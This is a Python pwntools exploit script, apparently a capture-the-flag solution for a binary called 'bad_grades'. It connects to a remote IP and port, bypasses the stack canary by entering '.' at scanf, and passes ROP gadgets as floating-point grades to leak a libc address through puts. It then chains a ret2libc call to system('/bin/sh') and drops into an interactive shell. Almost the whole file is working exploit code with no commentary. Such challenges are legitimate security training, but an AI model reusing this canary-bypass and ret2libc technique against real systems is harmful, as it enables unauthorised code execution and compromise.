from pwn import *
import pdb

gs = '''
init-pwndbg
handle SIGALRM ignore
c
'''

def tofloat(valor):
    return (struct.unpack("<d", p64(valor))[0])

context(terminal=['tmux', 'split-window', '-h'])

elf = ELF('./bad_grades')
libc = ELF('./libc.so.6')

r = remote('94.237.57.215', 48000)
#r = gdb.debug('./bad_grades', gdbscript=gs, aslr=False)
#r = process('./bad_grades')

# bypass canary with . in scanf + libc leak

r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'Number of grades: ', b'39')

for i in range(1, 35):
    grade_num = f'Grade [{i}]: '
    r.sendlineafter(grade_num.encode('utf-8'), b'.')

grade_num = 'Grade [35]: '
r.sendlineafter(grade_num.encode('utf-8'), b'.')

pop_rdi = 0x401263
main_plt = 0x401108
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

#payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)

grade_num = 'Grade [36]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(pop_rdi)).encode('utf-8'))

grade_num = 'Grade [37]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(puts_got)).encode('utf-8'))

grade_num = 'Grade [38]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(puts_plt)).encode('utf-8'))

grade_num = 'Grade [39]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(main_plt)).encode('utf-8'))

junk = r.recvuntil('Your new average is: ')
r.recvline()

received = r.recv(6)

leak = u64(received.ljust(8, b'\x00'))
log.info("Leaked libc address puts@got: " + hex(leak))

libc.address = leak - 0x80aa0
log.info("Libc base address %s " % hex(libc.address))


# ret2libc 

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'Number of grades: ', b'39')

for i in range(1, 35):
    grade_num = f'Grade [{i}]: '
    r.sendlineafter(grade_num.encode('utf-8'), b'.')


grade_num = 'Grade [35]: '
r.sendlineafter(grade_num.encode('utf-8'), b'.')


ret_gadget = 0x0000000000400666
bin_sh = 0x1b3e1a
system = 0x4f550


bin_sh_addr = libc.address + bin_sh
system_addr = libc.address + system


grade_num = 'Grade [36]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(ret_gadget)).encode('utf-8'))

grade_num = 'Grade [37]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(pop_rdi)).encode('utf-8'))

grade_num = 'Grade [38]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(bin_sh_addr)).encode('utf-8'))

grade_num = 'Grade [39]: '
r.sendlineafter(grade_num.encode('utf-8'), str(tofloat(system_addr)).encode('utf-8'))

r.interactive()
